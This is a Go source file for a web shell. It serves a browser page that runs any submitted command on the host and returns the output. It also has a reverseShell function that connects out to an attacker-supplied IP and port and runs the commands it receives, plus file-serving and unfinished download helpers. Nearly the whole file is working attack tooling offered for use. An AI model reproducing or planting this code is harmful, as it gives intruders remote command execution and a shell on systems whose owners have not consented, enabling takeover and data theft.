package webShell

import (
	"bufio"
	"flag"
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"os/exec"
	"strings"
)

func fileServe(sPort string, directory string) {
	flag.Parse()
	http.Handle("/", http.FileServer(http.Dir(directory)))
	log.Fatal(http.ListenAndServe(":"+sPort, nil))
}

func reverseShell(ip string, port string) {
	conn, _ := net.Dial("tcp", ip+":"+port)
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		shellRunCmd(message, conn)
	}
}

func shellRunCmd(cmd string, conn net.Conn) string {
	out, err := exec.Command(strings.Split(cmd, "\n")[0]).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
	return string(out)
}

func localCmd(cmd string) string {
	out, _ := exec.Command(strings.Split(cmd, "\n")[0]).Output()
	return string(out)
}

func handler(w http.ResponseWriter, r *http.Request) {

	page :=
		`<!DOCTYPE html>
			<html>
			<head>
			  <style>
			  div {border: 1px solid black; padding: 5px; width: 820px; background-color: #808080; margin-left: auto; margin-right: auto;}
			  </style>
			</head>
			<body bgcolor="#1a1a1a">
			  <div>
			  <form action="/" method="POST">
			    IP: <input type="text" name="ip" value="localhost"/>
			    Port: <input type="text" name="port" value="4443"/>
			    <input type="submit" value="Connect">
			  </form>
				<b>Download</b>
			  	<form action="/" method="POST">
			    URL: <input type="text" name="host"/>
			    <input type="submit" placeholder="http://yoursite:ip/file">
			  </form>
			  </div>
			  <br>
			  <div>
			  <textarea style="width:800px; height:400px;">{{.}}</textarea>
			  <br>
			  <form action="/" method="POST">
			    <input type="text" name="cmd" style="width: 720px" autofocus>
			    <input type="submit" value="Run" style="width: 75px">
			  </form>
			  </div>
			</body>
		</html>`

	out := ""
	if r.Method == "POST" {
		r.ParseForm()
		if len(r.Form["ip"]) > 0 && len(r.Form["port"]) > 0 {
			ip := strings.Join(r.Form["ip"], " ")
			port := strings.Join(r.Form["port"], " ")
			reverseShell(ip, port)
		}
		if len(r.Form["cmd"]) > 0 {

			cmd := strings.Join(r.Form["cmd"], " ")
			out = "$ " + cmd + "\n" + localCmd(cmd)
		}

		if len(r.Form["host"]) > 0 {

			cmd := strings.Join(r.Form["cmd"], " ")
			/// download
		}
	}

	t := template.New("page")
	t, _ = t.Parse(page)
	t.Execute(w, out)
}

func Run() {
	var ip, port string
	flag.StringVar(&ip, "ip", "", "IP")
	flag.StringVar(&port, "port", "8080", "Port")
	//flag.String(&dir, "dir", ".", "Directory to host")
	//flag.String(&sPort, "sPort", "8100", "Server Port")

	flag.Parse()

	http.HandleFunc("/", handler)
	http.ListenAndServe(ip+":"+port, nil)
}
